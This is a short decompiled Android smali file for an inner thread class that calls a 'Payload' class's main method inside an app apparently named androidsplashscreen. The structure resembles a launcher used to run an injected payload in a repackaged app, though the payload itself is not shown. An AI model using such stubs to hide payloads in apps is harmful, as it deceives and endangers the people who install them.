.class Lid/web/aiueo/androidsplashscreen/Payload$C00001;
.super Ljava/lang/Thread;
.source "Payload.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lid/web/aiueo/androidsplashscreen/Payload;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x28
    name = "C00001"
.end annotation


# direct methods
.method constructor <init>()V
    .locals 3

    .prologue
    .line 34
    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .prologue
    .line 38
    move-object v0, p0

    const/4 v2, 0x0

    check-cast v2, [Ljava/lang/String;

    invoke-static {v2}, Lid/web/aiueo/androidsplashscreen/Payload;->main([Ljava/lang/String;)V

    return-void
.end method
